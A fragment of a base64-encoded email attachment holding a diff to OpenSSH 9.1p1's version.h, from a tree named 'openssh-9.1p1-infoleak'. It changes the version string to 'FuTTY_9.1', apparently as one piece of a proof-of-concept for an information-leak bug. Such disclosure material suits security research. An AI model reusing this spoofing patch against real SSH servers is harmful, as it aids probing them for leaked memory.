dmVyc2lvbi5oCTIwMjItMTAtMDMgMDc6NTE6NDIuMDAwMDAwMDAwIC0wNzAw
DQorKysgb3BlbnNzaC05LjFwMS1pbmZvbGVhay92ZXJzaW9uLmgJMjAyMy0w
Mi0yMSAxNTo1MDowOS4xNjcxOTg3NDQgLTA4MDANCkBAIC0xLDYgKzEsNiBA
QA0KIC8qICRPcGVuQlNEOiB2ZXJzaW9uLmgsdiAxLjk1IDIwMjIvMDkvMjYg
MjI6MTg6NDAgZGptIEV4cCAkICovDQogDQotI2RlZmluZSBTU0hfVkVSU0lP
TgkiT3BlblNTSF85LjEiDQorI2RlZmluZSBTU0hfVkVSU0lPTgkiRnVUVFlf
OS4xIg0KIA0KICNkZWZpbmUgU1NIX1BPUlRBQkxFCSJwMSINCiAjZGVmaW5l
IFNTSF9SRUxFQVNFCVNTSF9WRVJTSU9OIFNTSF9QT1JUQUJMRQ0K

--_002_20230222055430GA32113localhostlocaldomain_--
